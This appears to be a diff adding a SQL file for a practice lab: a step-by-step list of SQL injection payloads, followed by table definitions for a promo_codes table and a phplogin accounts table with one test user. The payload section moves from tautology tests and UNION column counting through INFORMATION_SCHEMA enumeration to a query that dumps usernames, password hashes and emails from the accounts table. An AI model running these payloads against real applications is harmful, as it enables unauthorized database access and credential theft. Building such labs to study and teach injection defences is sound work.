@@ -1,0 +1,51 @@
+
+-- SQLI test query
+' OR 1=1 -- 
+' OR '1'='1
+
+-- UNION statement to test columm number
+' UNION SELECT NULL; --
+' UNION SELECT NULL, NULL; --
+' UNION SELECT NULL, NULL, NULL; --
+-- Until 6 NULLs
+
+' UNION SELECT SCHEMA_NAME, 'dummy', 'dummy', NULL, NULL, NULL FROM INFORMATION_SCHEMA.SCHEMATA -- 
+
+-- Payload to enumerate table names
+' UNION SELECT TABLE_NAME, TABLE_SCHEMA, 'dummy', 0, NOW(), NOW() FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = DATABASE() --
+' UNION SELECT TABLE_NAME, TABLE_SCHEMA, 'dummy', 0, NOW(), NOW() FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'phplogin' --
+
+-- Get Columms names
+' UNION SELECT COLUMN_NAME, NULL, NULL, NULL, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'phplogin' AND TABLE_NAME = 'accounts' --
+
+' UNION SELECT id, username, password, email, NULL, NULL FROM phplogin.accounts --'
+
+
+-----------------------------------------------------------SQL CREATE STATEMENT------------------------------------------------------------------------------------
+
+-- USE DATABASE CALLED "promos"
+-- SQL for account table 
+CREATE TABLE IF NOT EXISTS promo_codes(
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    code VARCHAR(20) UNIQUE NOT NULL,
+    discount_percentage INT NOT NULL,
+    valid_until DATE NOT NULL,
+    uses_left INT NOT NULL,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+
+-- Insert sample promo code
+INSERT INTO promo_codes (code, discount_percentage, valid_until, uses_left)
+VALUES ('SUMMER2024', 20, '2024-08-31', 1000);
+
+-- USE DATABASE CALLED "phplogin"
+-- SQL for Accounts Table
+CREATE TABLE IF NOT EXISTS `accounts` (
+	`id` int(11) NOT NULL AUTO_INCREMENT,
+  	`username` varchar(50) NOT NULL,
+  	`password` varchar(255) NOT NULL,
+  	`email` varchar(100) NOT NULL,
+    PRIMARY KEY (`id`)
+) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
+
+INSERT INTO `accounts` (`id`, `username`, `password`, `email`) VALUES (1, 'test', '$2y$d9c9ebaf6c67cbb0cf2a051b12fcaa16', 'test@test.com');
